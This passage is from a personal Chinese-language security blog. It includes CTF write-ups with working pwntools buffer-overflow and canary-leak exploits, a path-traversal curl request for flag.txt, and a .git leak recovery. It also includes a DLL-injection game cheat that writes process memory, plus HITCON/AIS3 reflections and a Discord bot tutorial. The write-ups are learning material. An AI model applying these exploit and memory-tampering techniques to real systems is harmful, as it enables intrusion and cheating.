filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway2\u0026#34;) if args.GDB: gdb.attach(r,\u0026#39;b *(0x80492D3)\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; pop_ebp = 0x804930B win = 0x8049206 payload= cyclic(28) + p64(win)+p32(0xc0ffee)+p64(0x7ab1e) sla(\u0026#34;?\\n\u0026#34;,payload) r.interactive() color #\r其實不太懂這題，輸入A的數量剛好把array蓋滿，之後就會噴flag了\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # flag bctf{1_d0n7_c4r3_571ll_4_m1d_c010r} crypto #\rnxor #\r做xor先得出key，再去解flag，都xor回去就好\nimport os def xnor_bit(a_bit, b_bit): if a_bit == \u0026#34;1\u0026#34; and b_bit == \u0026#34;1\u0026#34;: return \u0026#34;1\u0026#34; elif a_bit == \u0026#34;1\u0026#34; and b_bit == \u0026#34;0\u0026#34;: return \u0026#34;0\u0026#34; elif a_bit == \u0026#34;0\u0026#34; and b_bit == \u0026#34;1\u0026#34;: return \u0026#34;0\u0026#34; elif a_bit == \u0026#34;0\u0026#34; and b_bit == \u0026#34;0\u0026#34;: return \u0026#34;1\u0026#34; def xnor_byte(a_byte, b_byte): a_bits = get_bits_from_byte(a_byte) b_bits = get_bits_from_byte(b_byte) result_bits = [xnor_bit(a_bits[i], b_bits[i]) for i in range(8)] result_byte = get_byte_from_bits(result_bits) return result_byte def xnor_bytes(a_bytes, b_bytes): assert len(a_bytes) == len(b_bytes) return bytes([xnor_byte(a_bytes[i], b_bytes[i]) for i in range(len(a_bytes))]) def get_bits_from_byte(byte): return list(\u0026#34;{:08b}\u0026#34;.format(byte)) def get_byte_from_bits(bits): return int(\u0026#34;\u0026#34;.join(bits), 2) message = b\u0026#34;Blue is greener than purple for sure!\u0026#34; key = bytes.fromhex(\u0026#39;430e026909e35c169518dc18832d134d156862635e5fc58175fe9dafd88819e22e25bb2326\u0026#39;) flag = \u0026#34;de9289f08d6bcb90359f4dd70e8d95829fc8ffaf90ce5d21f96e3d635f148a68e4eb32efa4\u0026#34; enc_flag = bytes.fromhex(flag) encrypted_hex = \u0026#34;fe9d88f3d675d0c90d95468212b79e929efffcf281d04f0cfa6d07704118943da2af36b9f8\u0026#34; encrypted_bytes = bytes.fromhex(encrypted_hex) def main(): print(f\u0026#34;\\nMessage: {message}\u0026#34;) encrypted = xnor_bytes(message, encrypted_bytes) print(f\u0026#34;key: {encrypted.hex()}\u0026#34;) encrypted_flag = xnor_bytes(enc_flag, key) print(f\u0026#34;Encrypted flag: {encrypted_flag}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() flag: bctf{why_xn0r_y0u_b31ng_so_3xclu51v3}\nrsa #\r好用 https://www.dcode.fr/rsa-cipher flag: bctf{f4c70r1z3_b3773r_4d3b35e4}\nmisc #\rsanity #\r其實就是welcome\ndonut #\r一個開頭隨機的河內塔問題\n成功借助工人智慧解開\ngitgoo #\r先透過 gitTool 下載網站意外洩露的.git內容的東西\n./gitdumper.sh https://gitgoo.challs.pwnoh.io/.git/ dest-dir 直接進去看 .git/log/HEAD 的內容 發現在版本號9b474236ba20cf3f7d484b76348de51c819c0d65 有顯示洩露了flag 然後就回朔就好ㄌ\n進到dest-dir開始查看git的東西\ngit checkout 9b474236ba20cf3f7d484b76348de51c819c0d65\rgit show flag: bctf{1_h4v3_c0mm17m3n7_i55u3s_cf39ab917a7dd092992a8f9b}\nweb #\rfu #\rflag在原始碼內，但在網頁內不能F12或右鍵查看 在網址最前面加view-source:即可\nforensics #\runknown #\r下載，打開\n沒解出來但好奇的 #\rbeginner-pwn / calculator、runway3 #\r這兩題都是有開canary檢測是否有overflow的，這邊先講run3\n這題執行後會讓你輸入兩次，每次輸入後都會echo回去\n由於沒有特別檢測，因此這邊第一次輸入可以輸入\u0026amp;13$p來leak出canary的值\n因此最後payload就變成先傳送到能覆蓋的部分，接著送入canary的值，送入p64(0)對齊，最後輸入win function\n這邊直接跳到win func的頭會有問題，最少要跳到win+0x5以後才可以正常開shell\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway3\u0026#34;) if args.GDB: gdb.attach(r) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; sla(b\u0026#34;?\\n\u0026#34;, b\u0026#34;%13$p\u0026#34;) canary = int(r.readline().decode(), 16) win = 0x4011D6 + 0x5 payload= cyclic(40) payload+=p64(canary) payload += p64(0) payload+=p64(win) sl(payload) r.interactive() 另一題calu則是一個計算機，一開始讓你輸入兩個數字做運算，最後讓你輸入任意東西\n這邊先透過在第一次輸入1*pi，接著他會問你pi要幾位數，輸入100016，後面[-11:-3]即為canary的內容\n接下來就和上面run3差不多ㄌ\n參考write up\npwn / no_handouts #\r以為是ret2libc 結果是要串ROP自己寫shell去讀flag.txt\n哈哈我回去乖乖複習ROP那堂課\u0026hellip;\nweb / SSFS #\r本來以為是web shell結果只是LFI哈哈\n直接在網站搜尋/../../flag.txt，前面../的部分會被自動審略，因此透過curl \u0026ndash;path-as-is來避免過濾掉../\ncurl --path-as-is https://ssfs.challs.pwnoh.io/download/../../flag.txt forensics / couch potato、wreck、duck-pics #\rcouch potato 一個wav檔，透過\rSSTV Decoder轉成png就有flag了 wreck 一個elf檔案，strings grep flag他會看到有flag.jpg的東西，透過binwalk把他內容dump下來\nbinwalk -e --dd=\u0026#39;.*\u0026#39; dump 進入資料夾後\nfile * |grep JPEP xdg-open 檔案編號 duck-pics pcap題目 查看內容猜測是跟鍵盤運作有關，先把內容dump下來，在透過\r工具解密\ntshark -r capture.pcapng -Y \u0026#39;usb.src == \u0026#34;1.1.1\u0026#34;\u0026#39; -T fields -e usbhid.data |sed \u0026#39;s/../:\u0026amp;/g2\u0026#39; \u0026gt; output python3 convert.py output 參考write up\n總結 #\r這次學到了滿多東西，一些工具的使用，還有一些之前學到的技術的實際應用\n後面看別人的wu也學了滿多東西(主要是canary的部分啦)\n然後我這次的排版我覺得有夠醜 下禮拜改進\n最後隨便放一句\n時よ止まれ、おまえは美しい\n","date":"30 September 2024","externalUrl":null,"permalink":"/posts/007_weeklyctf02/","section":"Posts","summary":"這次打的是BuckeyeCTF 2024","title":"每周CTF計畫02","type":"posts"},{"content":"\r耶其實我還有在牛肉湯讀書會發表這個\n其實滿廢的 對不起大家。\r動機 #\r這次的被害者是 SupermarketTogether\n這是一個模擬超市經營的遊戲，但這次的外掛跟這部分完全沒關係\n簡單來講在這個遊戲內有一個房間，是正常遊玩進不去，門口有空氣牆堵住\n然後房間內有一隻大象，下圖就是房間內的畫面\n總之我的目的就是要進去房間內，對就是那麼廢。\n進入房間內 #\r正常方法(? #\r一開始先去看了一下正常該如何透過遊戲內的bug卡進去房間內\n簡單來講就是透過unity其中的3D物件不斷重疊會發生穿模的bug來卡入房間內 具體如何進入的話可以查看下面這個影片的7:40的部分 https://www.bilibili.com/video/BV1XXeneoEcJ/\n透過CheatEngine #\rCheatEngine(以下簡稱CE)，是一個常用來改遊戲內參數的外掛工具，這邊不特別介紹\n參考影片的話可以看下列兩個，上面成大資安社的社課主要是介紹CE的基礎使用，下面的則是透過CE來找座標，建議搭配食用 小提醒：找座標時記得把類型改成float比較好找 那總之透過不斷搜尋後就可以找到控制x座標的部分了，接著把參數改成2.5即可進入房間內\n恭喜你也是很酷的人了 啪嘰啪嘰啪嘰\n值得一提的是，再找參數的時候有發現兩個控制座標的參數\n但其中一個改值後不會馬上生效，另一個則會\n最後推斷是，其中一個是主要控制的，另一個則有點像是附屬的感覺(?\nDLL #\r來到這次的重點了，前面單純透過CE來改參數的部分不論是速度還是什麼，缺點太多了\n因此這邊我們就來把它寫成DLL的形式，透過DLL injection來注入我們寫的壞壞的東西\n以此來達到按下特定按鍵就可以瞬移進入房間內的功能\n先丟一下github 裡面有這次的原碼及DLL Betan423/SupermarkerTogether-dll\r在B33F50UP讀書會上分享的外掛原始檔\rC\u0026#43;\u0026#43; 0\r0\r遇到問題 #\r本次遇到最大的問題是，每次開啟所佔用的的address都不同，因此也就不能單純透過一個固定修改某處address的DLL來打天下\n而我最初的想法是，會不會他只是base address不同，而其他彼此參數間的相對位置則是固定的\n如果參數間的相對距離是固定的，我們也就能透過先去尋找一個好找一點的值(像是金錢)，接著再透過他跟x座標彼此間的address差值，就能夠快速找出x座標的address了\n但在重複找了許多次金錢與x座標的address，發現他們彼此間的差值是沒有相關的qq\nmoney place 差值 12455A43E80 1222316B88C 2 328D 85F4 1CD5CB93BE0 1CB32953D08 2 2A23 FED8 1D652C40BE0 1D402B92B6C 2 500A E074 28FE89F9E80 28D82C0752C 2 65DF 2954 1AFDC3D4940 1ADA2B77B98 2 3985 CDA8 因此最後的方案就還是要先在開始時去尋找x座標的address，接著再透過輸入進去DLL內，來改變其中預設的address值(預設是寫0x0400000 但當然不可能是這邊)\nDLL說明 #\r最終DLL的步驟就是先透過讓用戶按下i來出現輸入address的對話框，接著修改後就能透過按下o來瞬移進房間內。按下l來離開房間內\n這邊可以搭配上面github內的final.cpp原始碼一起看，這邊就不特別貼整段原始碼了\n定義類型 #\r剛剛有提到我們是夠過float來改會比較方便，因此在最開頭的地方先定義好\n#define TYPE float 定義參數 #\r在上面先宣告好參數，在最後的時候給參數附值，也就是我們瞬移後要的座標是多少\nstruct Params { TYPE x_go; // 位置 TYPE y_go; TYPE x_back; TYPE y_back; }; ... g_params.x_go = 2.5f; g_params.y_go = 2.8f; g_params.x_back = 2.0f; g_params.y_back = 2.8f; 取得地址 #\r會跳出兩個對話框，一個是讓你輸入address的，一開始會顯示請輸入新的記憶體位址（十六進位）；另一個則是單純確認框，輸入好後按下去即可修改\nDWORD_PTR GetUserInputAddress() { //輸入部分 HWND hwndInput = CreateWindowEx( 0, L\u0026#34;EDIT\u0026#34;, NULL, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_VISIBLE | ES_LEFT, CW_USEDEFAULT, CW_USEDEFAULT, 300, 100, NULL, NULL, GetModuleHandle(NULL), NULL ); SetWindowText(hwndInput, L\u0026#34;請輸入新的記憶體位址（十六進位）\u0026#34;); ShowWindow(hwndInput, SW_SHOW); UpdateWindow(hwndInput); char input[17] = { 0 }; // 確認部分 if (MessageBox(NULL, L\u0026#34;請輸入新的記憶體位址（十六進位）並按下確認\u0026#34;, L\u0026#34;輸入地址\u0026#34;, MB_OKCANCEL) == IDOK) { GetWindowTextA(hwndInput, input, sizeof(input)); DestroyWindow(hwndInput); return strtoull(input, NULL, 16); // 將輸入的十六進位字符串轉換為地址 } // 出錯返回原地址 DestroyWindow(hwndInput); return g_x_address; } 修改參數 #\r這邊就是結合上面兩個定義好的address以及先前設定的參數來修改內存的值了\nif (GetAsyncKeyState(\u0026#39;O\u0026#39;) \u0026amp; 0x8000) // 0x8000 表示該鍵被按下 { WriteProcessMemory(hProcess, (LPVOID)(g_x_address), \u0026amp;g_params.x_go, sizeof(TYPE), NULL); WriteProcessMemory(hProcess, (LPVOID)(g_x_address - 0x10), \u0026amp;g_params.y_go, sizeof(TYPE), NULL); } if (GetAsyncKeyState(\u0026#39;L\u0026#39;) \u0026amp; 0x8000) // 0x8000 表示該鍵被按下 { WriteProcessMemory(hProcess, (LPVOID)(g_x_address), \u0026amp;g_params.x_back, sizeof(TYPE), NULL); WriteProcessMemory(hProcess, (LPVOID)(g_x_address - 0x10), \u0026amp;g_params.y_back, sizeof(TYPE), NULL); } 總結 #\r耶大概就這樣，DLL外掛的衍伸應用還有很多，絕對不會只有單純這樣改參數這麼簡單，但窩不會，像是也可以透過掛個hook之類的來修改原本的運作方法\u0026hellip; 以後如果學到的話會再來寫布拉格的 大概\n","date":"26 September 2024","externalUrl":null,"permalink":"/posts/006_supermarketdll/","section":"Posts","summary":"把CE改參數部分寫成dll來注入","title":"超市一起瞬移DLL","type":"posts"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/%E8%B3%87%E5%AE%89/","section":"Tags","summary":"","title":"資安","type":"tags"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/%E9%81%8A%E6%88%B2%E5%A4%96%E6%8E%9B/","section":"Tags","summary":"","title":"遊戲外掛","type":"tags"},{"content":"\r假裝自己在參加鐵人賽\r前言 #\r這次參加的是 IERAE CTF ，其實本來是有報名三場CTF的，但最後只有這場解出比較多題(但也沒多少)，所以就專注寫這個了\n之後的步調應該也都會差不多是這樣，先報名2~3個CTF，最後再看要主打哥哪個\n本次排名 106/224 解出四題qq\n題目 #\rWelcome #\rflag在DC內，就單純進去找 :)\nOMG #\r類型: web\n一個網頁，然後只要按返回前一頁33次就可以了\nderangement #\r類型: crypto\n有一個隨機產生的16個字符，然後裡面會不斷隨機排列他們的順序，目標是找出正確的順序\n查看加密法後會發現字符不會出現在本來正確的地方，因此只要多跑幾次就可以順利得出本來的順序了\n本來是想硬搓的，但想說這樣沒甚麼用還是透過pwntool寫好了\nfrom pwn import * # 開啟程序 p = remote(\u0026#39;104.199.135.28\u0026#39;, 55555) # 用來存儲所有獲得的提示 hints = [] ans=\u0026#39;\u0026#39; p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;,\u0026#39;1\u0026#39;) response = p.recvuntil(\u0026#39;hint: \u0026#39;).decode() world = p.recvline().decode().strip() a = world b = world c = world d = world e = world f = world g = world h = world i = world j = world k = world l = world m = world n = world o = world time =0 try: while time\u0026lt;100: # 發送 \u0026#34;1\u0026#34; 來獲取提示 p.sendline(\u0026#39;1\u0026#39;) # 接收並解析提示 response = p.recvuntil(\u0026#39;hint: \u0026#39;).decode() hint = p.recvline().decode().strip() hints.append(hint) print(f\u0026#39;Received hint: {hint}\u0026#39;) # 可以在這裡添加邏輯來分析 hints 並推測原始魔法詞 if hint[0] in a: a = a.replace(hint[0], \u0026#34;\u0026#34;) if hint[1] in b: b = b.replace(hint[1], \u0026#34;\u0026#34;) if hint[2] in c: c = c.replace(hint[2], \u0026#34;\u0026#34;) if hint[3] in d: d = d.replace(hint[3], \u0026#34;\u0026#34;) if hint[4] in e: e = e.replace(hint[4], \u0026#34;\u0026#34;) if hint[5] in f: f = f.replace(hint[5], \u0026#34;\u0026#34;) if hint[6] in g: g = g.replace(hint[6], \u0026#34;\u0026#34;) if hint[7] in h: h = h.replace(hint[7], \u0026#34;\u0026#34;) if hint[8] in i: i = i.replace(hint[8], \u0026#34;\u0026#34;) if hint[9] in j: j = j.replace(hint[9], \u0026#34;\u0026#34;) if hint[10] in k: k = k.replace(hint[10], \u0026#34;\u0026#34;) if hint[11] in l: l = l.replace(hint[11], \u0026#34;\u0026#34;) if hint[12] in m: m = m.replace(hint[12], \u0026#34;\u0026#34;) if hint[13] in n: n = n.replace(hint[13], \u0026#34;\u0026#34;) if hint[14] in o: o = o.replace(hint[14], \u0026#34;\u0026#34;) ans=a+b+c+d+e+f+g+h+i+j+k+l+m+n+o print(ans) if(len(ans)==15): p.sendline(\u0026#39;2\u0026#39;) p.sendline(ans) p.interactive() except Exception as e: print(f\u0026#39;Connection closed or error occurred: {e}\u0026#39;) finally: p.close() Assignment #\r類型: rev\n透過IDA打開可以看到順序被打亂的flag\n但打開F5後就可以看到排列好順序的flag了 總結 #\r這次其實都只有解出水題出來w\n但畢竟才第一周\n其實我也不知道這樣會不會有效果 但就先嘗試看看\n之後會再補充一些自己沒解出來的題目，但是去查看別人wu解出來的內容\n最後分享一個這次在比賽結束後看到的\n在講這次比賽crypto類型的題目，頻道內容也有其他資安相關的影片\n不過是日文的VT\n","date":"23 September 2024","externalUrl":null,"permalink":"/posts/005_weeklyctf01/","section":"Posts","summary":"你說的對但這就是CTF","title":"每周CTF計畫01","type":"posts"},{"content":"\r今年是我第一次參加HITCON，而我有幸能順利錄取學生免費方案，這邊再次感謝HITCON官方\r感想 #\r這邊先改一下順序，先講一下這次活動的感想，對於本活動有興趣的話可以再去閱讀下面的相關介紹\n這次的badge電路板、各種的攤位活動也都很有趣，議程也是有讓我了解了許多新東西，而且免費早餐跟點心也很都好吃👉👈 因為自己這次主要是有在協助NISRA擺攤，因此其實這次主要是待在社群攤位，中間也有去聽了幾場自己感興趣的議程 這次活動讓我收穫許多，無論是badge的遊戲闖關、各種攤位活動、相關議程等，都讓我認識了許多全新的人，已經學習到了許多自己以前從未接觸過的方面\n我認為HITCON CMT是十分適合不論你是剛入門資安，又或是已經對於資安有一定的了解都可以來參加\n資安新手 #\r對於剛入門的人來講，在這邊能夠去聽一些自己有興趣的議程，了解該方面的未來發展、相關技術等，又或是可以到處認識一堆大佬，結交一些新朋友，讓你在資安的道路上不孤獨，畢竟會來HITCON的人或多或少都是對於資安有興趣的人，建議大家不要害羞，可以勇敢一點去多跟不論是社群攤位的社團、贊助商攤位，又或是你想在路上隨機搭訕路人也不是不行 (X\n資安老手 #\r而對於已經有一定程度的人來講，也能去多聽一些較為技術面向的議程，更重要的是如果平常有在打CTF的話，可以在現場看到一堆平常比賽時會遇到的賽棍\n也可以多去跟社群攤位聊一聊，或是參與他們的攤位活動，攤位的活動是比較技術取向的，也可以去激進自己的能力看看\n又或是要跟他們直接面試應該也不是不行\nHITCON #\r這邊先簡單介紹一下HITCON是甚麼 HITCON aka 台灣駭客年會 Hacks In Taiwan Conference\n今年(2024)為HITCON舉辦的第20周年(啪機啪機啪機)\n而HITCON活動內容我認為主要可以分成下列三個部分\n分別是 議程、社群攤位、贊助商攤位\n社群攤位 #\r社群攤位裡面主要是各校社團、資安相關社群等\n像是就有HITCON GIRLS、成大資安社(B33F 50UP戰隊)、中電會\u0026hellip;　當然還有我這次有幫忙的NISRA攤位 雖然我也在B33F 50UP戰隊就是了\n其實滿建議大家沒事就可以多來這邊跟各大社群做交流，如果你還是高中生的話，可以前往中電會與他們稍作交流，而如果你是大學生也可以去到TSC的攤位去做一些了解之類的\n當然也很歡迎去其他各大攤位去了解他們在幹嘛，我自己是滿開心如果有人來我們攤位的啦，相信其他攤位基本上也都是這樣，因此也建議大家不要害羞，盡量去多多與大家交流，而且還可以拿很多攤位的酷酷獎品(X\n贊助商攤位 #\r這邊主要是各大有贊助的廠商能夠來到這邊擺攤、介紹他們的公司，攤位也會有一些小活動，像是DEVCORE的套圈圈之類的。\n也能向各大攤位詢問一些他們公司的事項、或是你好奇的東西之類的\n其實基本上與社群攤位滿像的 只是變成是由公司擺攤\n議程 #\r這次去聽了很多場議程，而許多議程都不是用中文在講，但大家可以放心，現場都有開放同步口譯，因此也不用害怕自己聽不懂，反而還可以去接觸到平常很難有機會聽到的外文議程，也還可以多多訓練自己的外語聆聽能力(X\n但這邊主要介紹兩場印象比較深刻的議程，分別是Evasive attacks against AI-powered antivirus software - Yu Arai 、 Background of those glitches in Zelda BoTW \u0026amp; ToTK - Yuda\nEvasive attacks against AI-powered antivirus software - Yu Arai #\r這場議程主要是在介紹，他是如何bypass掉現在市面上現有的使用AI與傳統檢測技術的防毒軟體，以及最後也帶我們去思考了一下，會想繞過防毒是未來一定會面對到的議題，也因此該如何避免他們去繞過防毒也是一個很好也很重要的重點。\n而其實印象深刻的點主要有兩點，第一點是因為這場是日文的議程，本來以為自己可以不用靠翻譯就聽懂， 結果發現自己聽得懂的日文也就只有動漫那幾句\n而第二點其實是因為我今年AIS3專題做的部分也有點類似是在去靜態分析惡意軟體，因此發現自己做的類似的東西居然就這樣被bypass掉了，也有點震驚\nBackground of those glitches in Zelda BoTW \u0026amp; ToTK - Yuda #\r這場是請到有在youtube拍攝影片的Yuda來做講師，而本場議程主要是在介紹說他們在遊戲中是如果去挖掘、發現一些獨特的漏洞(GLITCH)，以及一些相關經驗分享等\n我認為這是一場很特別很酷的議程，他並非像是傳統常見的議程，他反而沒有特別介紹許多技術相關的內容，但是我覺得其中挖掘漏洞所需要的思考及創新結合，是資安人會滿需要具備的能力，就是能跳脫傳統思考的樣子，總之是場很棒的議程\n","date":"27 August 2024","externalUrl":null,"permalink":"/posts/004_2024hitcon/","section":"Posts","summary":"2024 HITCON心得","title":"2024 HITCON心得","type":"posts"},{"content":"\rAIS3 a.k.a. 大型網友見面會\n好好玩 明年還去\r前言 #\r這是我第一次參加AIS3 結果就不小心被我蹭到最佳專題獎了\n在這邊再次感謝小蔡、萊姆跟l3obo三位隊友的凱瑞\n專題 #\r主題發想 #\r我這次是選到情資運用及防護，組別為B8\n當初完全就是被這個看起來很酷的名子騙進來的，完全不知道這個在幹嘛 這也就導致我們專題主題想到了第二天才勉強定案，然後這邊要再跟我的組員道歉一次\n因為其實我一直想做有關惡意軟體的製作跟分析之類的，所以我算是有點堅持(?)的一直不放棄這個主題，結果最後也真的被我盧成功了\n最後的主題就是基於聚類分析技術的惡意程式變體辨識方法研究\n感謝勝舢助教協助主題發想🛐\n製作過程 #\r我負責的部分算是進行資料的前處理以及資料的後續消化分析\n所以後面他們在做分析的時候我的工作內容就變成了問有沒有人要吃起司\n報告 #\r我們大概是最後一天下午才開始慢慢做簡報的，我只能跟大家說\n完 全 做 不 完\n因為其實我對做簡報也沒有到很熟，加上對主題也有點迷茫，因此其實改了很多次\n然後重要的一件事一定要試報，而且我是覺得需要不只一次\n其實我在真的試報以後才發現自己在時間的掌握、說話的結構上都還有很多很多的問題，所以後面就是開始瘋狂審稿加一直練習報自己的部分\n那個時候突然在想，我怎麼把報告報到跟在跑speedrun一樣 一直在瘋狂壓時間 這邊也謝謝三角蛇跟pwn2ooown兩位助教有聽我們試報\n但結果最後報告時間還是沒捏好，大概多講了40秒以上;(\n我給自己報告的分數大概只有6/10\n總結 #\r我覺得AIS3其實滿適合像我這種，剛接觸有點概念了，但還是不太確定未來具體方向的人\n像我這種人來了AIS3就是兩個結果，一是確認自己未來方向；二是放棄資安\n本來是差點變成二了 但最佳專題獎讓我決定做資安這塊做到死了\n然後真的建議大家要住宿，晚上跟組員討論專題也是精華之一，我就有看到一組他們有組員沒住宿 我根本沒看過他們第四個組員\n又卷 #\rAIS3到底卷不卷，來這裡到底會不會爆肝？ 卷，卷死了。拜託大家不要再卷了\u0026hellip;\n累死 #\r其實我覺得來AIS3會不會爆肝是要看個人欸\n看你追求什麼吧，如果目標是最佳專題的話當然是會很累\n但如果你只是想要來學習知識跟找到方向的話其實是可以不用那麼累的，但當然要跟自己專題的組員好好協調、溝通好\n不過都來了那目標當然是要放在最佳專題上吧\n廢話時間 #\r本來剛報告完是滿絕望的 我覺得自己講得很爛 而且時間也沒抓好 所以絕望之下就有了下面這張\n結果最後還真的拿到了\n寫共筆真的很好玩，雖然感覺大家都只是把講師的報告打上去而已\n在下面註釋的地方聊天真的很好玩\n","date":"6 August 2024","externalUrl":null,"permalink":"/posts/003_2024ais3/","section":"Posts","summary":"AIS3 讚  我是好駭客","title":"2024 AIS3心得","type":"posts"},{"content":"","date":"6 August 2024","externalUrl":null,"permalink":"/tags/code/","section":"Tags","summary":"","title":"Code","type":"tags"},{"content":"\r因為最近dc很多音樂機器人都壞掉\n一氣之下就直接透過chatGPT寫一個出來了\r前言 #\r其實真的沒啥技術含量，因為代碼真的都是叫GPT幫我搓出來的\n但還是想說丟上來好了，畢竟在自己本地架機器人就不用看其他人的臉色了 (X 基本上會從頭開始講如何建立，但有些我沒碰到的功能就不會特別介紹\n因為我自己也不懂\n想抄代碼的可以直接跳到那邊就好了\n但還是放一下跟GPT溝通的流程之類的 水一下內容\n建立DC機器人 #\r首先先到\rDiscord Developer Portal 建立一個機器人出來\n登入後左上角New Application點下去，再取個名子，專屬你ㄉ機器人就誕生了\nNew Application\r剛進去就可以先看到設定的介面，這邊基本上就是可以設定機器人的名稱、頭貼、還有點進機器人會看到的描述\n然後DESCRIPTION的部分會在 關於我 的部分顯示 取得token #\r接著到旁邊選單選擇Bot\n在這邊可以額外設定機器人的橫幅(BANNER)\n而我們這邊主要要取得機器人的TOKEN\n點下去Reset Token確認後取得全新的token先自己記起來\n切記不要外洩 因為有token就能夠執行你的機器人了\nReset Token\r接著滑到下面Privileged Gateway Intents的部分，接著把三個選項都打勾\n這邊主要是要讓機器人能夠接收指令與用戶互動\n邀進伺服器 #\r進入OAuth2的部分，滑到最下面的OAuth2 URL Generator\n主要勾選bot就好\n而下面的BOT PERMISSIONS則是勾選Administrator\n直接拿所有權限就不用再慢慢設定了\nbot\rAdministrator\r再來往下看就可以在 GENERATED URL 看到你機器人的邀請連接了\n基本上機器人的部分就到這邊了 再來就是要寫code的部分了\n代碼 #\r安裝所需的庫 #\r打開你的cmd 一起快樂安裝\npip install discord.py youtube_dl pip install yt-dlp ffmpeg安裝 #\r前往\rBtbN FFmpeg Releases下載 ffmpeg-master-latest-win64-gpl.zip\n解壓縮後丟到一個不太會動到的地方\n接著打開環境變數，win11打開環境變數的方法如下\n設定 系統 系統資訊 進階系統設定 再來就能看到環境變數了\n接著選擇Path然後編輯，新增你剛剛解壓縮下來的檔案中bin資料夾的位置 (C:\\ffmpeg\\bin) 這樣就順利安裝完成了，可以檢查看看有沒有順利安裝，沒有的話就重開機看看\nffmpeg -version bot.py #\r主要可以分兩種撥放方式\n1.線上串流(較不穩定)\n2.下載到本機(很穩定)\n線上串流 #\r先講第一種線上串流的部分\n穩定性的部分就真的很爛 大概每首歌都撥不完 大概撥個一兩分鐘左右而已\nimport discord from discord.ext import commands import yt_dlp as youtube_dl import asyncio intents = discord.Intents.default() intents.message_content = True intents.voice_states = True bot = commands.Bot(command_prefix=\u0026#39;\u0026amp;\u0026#39;, intents=intents) ytdl_format_options = { \u0026#39;format\u0026#39;: \u0026#39;bestaudio/best\u0026#39;, \u0026#39;outtmpl\u0026#39;: \u0026#39;%(extractor)s-%(id)s-%(title)s.%(ext)s\u0026#39;, \u0026#39;restrictfilenames\u0026#39;: True, \u0026#39;noplaylist\u0026#39;: True, \u0026#39;nocheckcertificate\u0026#39;: True, \u0026#39;ignoreerrors\u0026#39;: False, \u0026#39;logtostderr\u0026#39;: False, \u0026#39;quiet\u0026#39;: True, \u0026#39;no_warnings\u0026#39;: True, \u0026#39;default_search\u0026#39;: \u0026#39;auto\u0026#39;, \u0026#39;source_address\u0026#39;: \u0026#39;0.0.0.0\u0026#39; } ffmpeg_options = { \u0026#39;options\u0026#39;: \u0026#39;-vn\u0026#39; } ytdl = youtube_dl.YoutubeDL(ytdl_format_options) class YTDLSource(discord.PCMVolumeTransformer): def __init__(self, source, *, data, volume=0.5): super().__init__(source, volume) self.data = data self.title = data.get(\u0026#39;title\u0026#39;) self.url = data.get(\u0026#39;url\u0026#39;) @classmethod async def from_url(cls, url, *, loop=None, stream=False): loop = loop or asyncio.get_event_loop() data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream)) if \u0026#39;entries\u0026#39; in data: data = data[\u0026#39;entries\u0026#39;][0] filename = data[\u0026#39;url\u0026#39;] if stream else ytdl.prepare_filename(data) return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data) queue = asyncio.Queue() queue_urls = [] current_player = None # 用於儲存當前播放的音樂 @bot.event async def on_ready(): print(f\u0026#39;Logged in as {bot.user}\u0026#39;) @bot.command() async def p(ctx, url): if not ctx.message.author.voice: await ctx.send(f\u0026#34;{ctx.message.author.name} is not connected to a voice channel\u0026#34;) return channel = ctx.message.author.voice.channel if ctx.voice_client is None: voice_client = await channel.connect() else: voice_client = ctx.voice_client # Queue the song await queue.put(url) queue_urls.append(url) if not voice_client.is_playing(): await play_next_song(ctx, voice_client) @bot.command() async def leave(ctx): if ctx.voice_client: await ctx.guild.voice_client.disconnect() @bot.command() async def q(ctx): if 